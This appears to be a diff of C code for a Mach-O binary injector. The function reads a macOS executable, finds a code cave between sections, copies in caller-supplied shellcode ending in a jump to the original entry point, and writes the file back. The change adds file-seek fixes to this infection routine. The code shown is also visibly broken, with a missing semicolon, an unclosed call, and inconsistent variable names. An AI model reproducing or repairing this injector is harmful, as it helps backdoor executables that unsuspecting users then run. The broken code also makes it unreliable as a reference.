@@ -13,6 +13,7 @@ int binject_MACH-O(char *file,char *shellcode)
    size=ftell(f);
 	int sclen=strlen(shellcode);
    char *file_buffer = calloc(1,size);
+  fseek(f,0,SEEK_SET);
   fread(file_buffer,1,size,f);
 	struct mach_header *header= (struct mach_header*)file_buffer;
 	oryginal_entry
@@ -90,8 +91,9 @@ for(uint32_t a=0;a<header->ncmds;a++)
 			uint32_t    cavelen= sectionCommand->offset-caveOffset;
 			if(scfixedlen<cavelen)
 			{
-				char *shellcodefixed = ApplySuffixJmpIntel64(shellcode,caveOffset,oryginal_entry,0) 
-				memcpy(buf+cave_offset,shellcodefixed,strlen(shellcodefixed);
+				 char *shellcodefixed = ApplySuffixJmpIntel64(shellcode,caveOffset,oryginal_entry,0) 
+				 memcpy(buf+cave_offset,shellcodefixed,strlen(shellcodefixed);
+				 fseek(f,0,SEEK_SET);
 				 fwrite(buf,1,size,f);
 				 free(shellcodefixed);
 				 free(file_buffer);
